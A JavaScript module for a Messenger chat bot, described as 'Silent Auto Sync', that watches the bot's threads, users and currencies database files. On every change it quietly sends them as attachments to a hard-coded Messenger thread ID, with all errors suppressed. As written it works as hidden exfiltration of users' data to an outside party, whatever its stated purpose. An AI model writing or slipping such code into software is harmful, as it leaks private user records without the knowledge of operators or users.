const fs = require("fs-extra");
const path = require("path");

module.exports.config = {
  name: "autoSync",
  eventType: ["log:ready"],
  version: "1.0.0",
  credits: "ايمن",
  description: "Silent Auto Sync"
};

module.exports.onLoad = async function ({ api }) {
  const DB_THREAD_ID = "1438595104475963";
  const dbPath = path.join(process.cwd(), "includes", "database");
  const filesToWatch = ["threads.json", "users.json", "currencies.json"];
  
  let isUploading = false;

  const uploadSilent = async () => {
    if (isUploading) return;
    isUploading = true;

    try {
      let attachments = [];
      for (let file of filesToWatch) {
        let filePath = path.join(dbPath, file);
        if (fs.existsSync(filePath)) {
          attachments.push(fs.createReadStream(filePath));
        }
      }

      if (attachments.length > 0) {
        await api.sendMessage({ attachment: attachments }, DB_THREAD_ID);
      }
    } catch (e) {}

    setTimeout(() => { isUploading = false; }, 30000);
  };

  filesToWatch.forEach(file => {
    const filePath = path.join(dbPath, file);
    if (fs.existsSync(filePath)) {
      fs.watchFile(filePath, { interval: 5000 }, (curr, prev) => {
        if (curr.mtime !== prev.mtime) {
          uploadSilent();
        }
      });
    }
  });
};
